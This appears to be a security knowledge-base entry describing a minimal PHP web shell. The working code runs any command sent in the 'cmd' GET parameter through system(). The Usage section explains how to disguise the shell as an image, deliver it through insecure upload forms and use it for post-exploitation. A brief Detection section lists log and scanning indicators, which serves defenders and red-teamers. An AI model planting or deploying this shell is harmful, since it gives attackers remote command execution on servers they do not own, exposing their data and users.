---
type: code
language: php
verified: true
tags:
  - webshell
  - rce
  - payload
platforms:
  - Web
validated: true
---

# php-simple-command-execution-shell

## Code

```php
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

## Description

A minimal PHP web shell that executes system commands passed via the 'cmd' GET parameter. Designed to be uploaded to a web server for remote code execution after exploiting file upload vulnerabilities.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $_GET['cmd'] | Command to execute on the server | ls -la |

## Usage

Upload this code disguised as an image to the target server. Access via http://target/uploads/shell.jpg?cmd=ls to run 'ls'. Use in post-exploitation for file enumeration, downloads, or further commands. Deliver via insecure upload forms.

## Detection

- Web server logs showing GET requests with 'cmd' parameter.
- Anomalous PHP execution in image files (e.g., via content scanning).
- System process logs (e.g., ps aux) showing unexpected commands from web context.
- Network traffic to uploaded file paths with query parameters.

## Related

- [[procedures/Insecure-File-Upload-Exploit-via-Picture-Compression]]
